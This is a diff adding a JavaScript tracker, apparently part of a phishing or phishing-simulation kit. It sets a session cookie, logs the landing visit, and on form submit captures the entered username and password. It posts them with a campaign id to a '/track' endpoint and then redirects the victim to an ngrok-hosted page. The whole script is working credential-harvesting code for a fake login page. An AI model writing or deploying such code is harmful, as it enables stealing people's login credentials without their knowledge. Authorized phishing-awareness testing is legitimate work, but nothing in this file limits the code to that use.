@@ -1,0 +1,77 @@
+
+<script src="https://localhost/mod?tlink=rafqwu"></script>
+
+
+
+var sess_id = "";
+var comp_name = "";
+var comp_username = "";
+var tracker_id = "rafqwu";
+var form_field_data;
+var xhr = new XMLHttpRequest();
+
+//geting cid
+var cid = window.location.search.split("cid=")[1].split("&")[0];
+
+//creating session cookie
+if (document.cookie.indexOf("tsess_id=") >= 0) { // cookie exists
+    cookie_arr = document.cookie.split(';');
+    cookie_arr.forEach(function(cookie) {
+        if (cookie.split('=')[0].trim() == 'tsess_id')
+            sess_id = cookie.split('=')[1];
+    });
+} else {
+    sess_id = Math.random().toString(36).substring(8);
+    document.cookie = "tsess_id=" + sess_id + ";SameSite=Lax";
+}
+
+var curr_page = (window.location.host + window.location.pathname).toLowerCase();
+var first_page = "8d86a19c20a4.ngrok.io/";
+if (curr_page == first_page) //if starting page
+    do_track_req_visit();
+
+function do_track_req_visit() {
+    xhr.open("POST", "https://localhost/track", true);
+    xhr.send(JSON.stringify({
+        page: 0,
+        trackerId: tracker_id,
+        sess_id: sess_id,
+        screen_res: screen.width + "x" + screen.height,
+        cid: cid
+    }));
+}
+//-----------------------------------------------------------
+
+if (document.readyState !== 'loading')
+    onReady();
+else {
+    document.addEventListener('DOMContentLoaded', function() {
+        onReady();
+    });
+}
+
+function onReady() {
+    if (document.getElementById("submit"))
+        document.getElementById("submit").onclick = function(e) {
+            form_field_data = {};
+            form_field_data.uname = document.getElementById('uname').value;
+            form_field_data.psw = document.getElementById('psw').value;
+            do_track_req(e, 1, "https://8d86a19c20a4.ngrok.io/");
+        }
+};
+//-----------------------------------------------------------
+function do_track_req(e, page, next_page_url) {
+    e.preventDefault();
+    xhr.open("POST", "https://localhost/track", false);
+    xhr.send(JSON.stringify({
+        page: page,
+        trackerId: tracker_id,
+        sess_id: sess_id,
+        screen_res: screen.width + "x" + screen.height,
+        form_field_data: form_field_data,
+        cid: cid
+    }));
+
+    if (next_page_url != "#")
+        window.top.location.href = next_page_url + "?cid=" + cid;
+}
